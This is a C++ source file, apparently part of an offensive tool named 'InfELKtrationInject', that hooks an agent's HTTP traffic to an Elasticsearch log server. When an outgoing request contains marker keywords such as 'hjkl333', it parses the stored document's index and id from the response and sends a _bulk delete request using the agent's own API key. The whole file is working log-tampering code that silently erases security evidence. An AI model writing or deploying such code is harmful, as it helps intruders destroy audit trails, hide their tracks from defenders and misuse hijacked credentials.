#include "pch.h"
#include "HttpIntercept.h"
#include "LibConstants.h"
#include <winhttp.h>
#include <Shlwapi.h>

#pragma warning( disable : 6386 )

#define NUM_MAL_WORDS 2
const char* maliciousKeywords[NUM_MAL_WORDS] = {
	"hjkl333",
	"hjkl444"
};

const wchar_t* acceptTypes[2] = {
	L"application/json",
	NULL
};

#define INDEX_KEY_LEN 11
PCSTR index_key = "\"_index\":\"";

#define ID_KEY_LEN 9
PCSTR id_key = ",\"_id\":\"";

#define POST_BODY_MAX_SIZE 0x600

void HttpIntercept(PCSTR reqBytes, PCSTR respBytes, PCSTR apiKey) {
	// not going to use the apiKey param because sometimes there is junk data before the null termination, not sure why
	// use the one at API_KEY_LOCATION

	BOOL needToDelete = false;
	HINTERNET hSession, hConnect, hRequest;
	LPVOID postBody;
	size_t off1, off2;
	PCSTR tmp, tmp2;
	DWORD len;

	Logger::Info("Executing HTTP interception code");

	if (!reqBytes || !respBytes) {
		Logger::Warning("One of the params was null, aborting HTTP interception code");
		return;
	}

	for (int i = 0; i < NUM_MAL_WORDS; i++) {
		if (strstr(reqBytes, maliciousKeywords[i])) {
			Logger::Info("Intercepted a request with a malicious keyword: %s", maliciousKeywords[i]);
			needToDelete = true;
		}
	}
	
	if (!needToDelete) return;
	
	// allocate mem for post body stuff
	postBody = VirtualAlloc(NULL, POST_BODY_MAX_SIZE, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!postBody) {
		Logger::Error("VirtualAlloc failed");
		Logger::LastError();
		return;
	}
	memset(postBody, 0, POST_BODY_MAX_SIZE);

	// parse things out
	// after the first occ of "_index":" and before " is the index
	// after the first occ of ,"_id":" and before " is the id
	// THIS CODE IS TERRIBLE. NEVER DO THIS.
	tmp = StrStrA(respBytes, index_key);
	if (!tmp) {
		// this is ok sometimes, the first request every so often is a heartbeat to /
		Logger::Warning("didn't find the index key in the resp body, aborting");
		goto dealloc;
	}
	off1 = tmp - respBytes + INDEX_KEY_LEN;
	tmp2 = StrStrA(respBytes + off1, "\"");
	off2 = tmp2 - respBytes;
	memcpy_s((void*)((intptr_t)postBody + 0x500), 0x80, respBytes + off1 - 1, off2 - off1 + 1);
	
	tmp = StrStrA(respBytes, id_key);
	if (!tmp) {
		// this shouldn't be reached ever, but better safe than sorry
		Logger::Error("failed to find ID in resp body, aborting");
		goto dealloc;
	}
	off1 = tmp - respBytes + ID_KEY_LEN;
	tmp2 = StrStrA(respBytes + off1, "\"");
	off2 = tmp2 - respBytes;
	memcpy_s((void*)((intptr_t)postBody + 0x580), 0x80, respBytes + off1 - 1, off2 - off1 + 1);

	// the index is at postBody+0x500, and the id is at postBody+0x580
	sprintf_s((char*)postBody, 0x500, "{\"delete\":{\"_index\":\"%s\",\"_id\":\"%s\"}}\n", (char*)postBody + 0x500, (char*)postBody + 0x580);
	len = (DWORD)strlen((char*)postBody);

	// start an HTTP session
	hSession = WinHttpOpen(L"InfELKtrationInject/1.0", WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, NULL);
	if (!hSession) {
		Logger::Error("WinHttpOpen failed");
		Logger::LastError();
		return;
	}

	// spawn a connection to the server
	hConnect = WinHttpConnect(hSession, (LPCWSTR)ES_HOST_LOCATION, (INTERNET_PORT)*(INTERNET_PORT*)ES_PORT_LOCATION, NULL);
	if (!hConnect) {
		Logger::Error("WinHttpConnect failed");
		Logger::LastError();
		goto closeSess;
	}

	// create a new request
	hRequest = WinHttpOpenRequest(hConnect, L"POST", L"/_bulk", NULL, WINHTTP_NO_REFERER, acceptTypes, WINHTTP_FLAG_SECURE);
	if (!hRequest) {
		Logger::Error("WinHttpOpenRequest failed");
		Logger::LastError();
		goto closeConn;
	}

	// add the auth header
	if (!WinHttpAddRequestHeaders(hRequest, (LPCWSTR)API_KEY_LOCATION, -1, WINHTTP_ADDREQ_FLAG_ADD)) {
		Logger::Error("WinHttpAddRequestHeaders failed");
		Logger::LastError();
		goto closeReq;
	}

	// add the content-type header
	if (!WinHttpAddRequestHeaders(hRequest, L"Content-Type: application/json; charset=UTF-8", -1, WINHTTP_ADDREQ_FLAG_ADD)) {
		Logger::Error("WinHttpAddRequestHeaders failed");
		Logger::LastError();
		goto closeReq;
	}

	// send the http request
	// TODO make this resilient to an untrusted HTTPS cert
	// https://stackoverflow.com/a/19693449
	if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, NULL, postBody, len, len, NULL)) {
		Logger::Error("WinHttpSendRequest failed");
		Logger::LastError();
		goto closeReq;
	}

	Logger::Info("Deleted ES document %s", (char*)postBody + 0x580);

closeReq:
	WinHttpCloseHandle(hRequest);
closeConn:
	WinHttpCloseHandle(hConnect);
closeSess:
	WinHttpCloseHandle(hSession);
dealloc:
	VirtualFree(postBody, NULL, MEM_RELEASE);
}
